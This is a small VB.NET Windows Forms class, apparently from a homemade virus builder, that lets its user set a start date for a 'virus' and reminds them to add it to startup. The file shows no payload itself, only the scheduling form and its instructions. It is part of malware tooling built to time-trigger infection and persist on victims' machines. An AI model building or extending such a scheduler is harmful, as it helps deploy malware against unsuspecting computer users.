Public Class Daynight

    Private Sub NyX_Theme1_Click(sender As Object, e As EventArgs) Handles NyX_Theme1.Click

    End Sub

    Private Sub NyX_Button1_Click(sender As Object, e As EventArgs) Handles NyX_Button1.Click
        MsgBox("This will make the virus start at specifque date here is an exmaple of how to write a date  if for exmaple the day or the month is 5 wich means mai then you will write 05 not 5 the same thing applis to the days...", MsgBoxStyle.Information, "info")
        MsgBox("don't forget to add it to startup ")
    End Sub

    Private Sub NyX_Button12_Click(sender As Object, e As EventArgs) Handles NyX_Button12.Click
        Form1.strt_date = MaskedTextBox1.Text
        Me.Hide()
    End Sub
End Class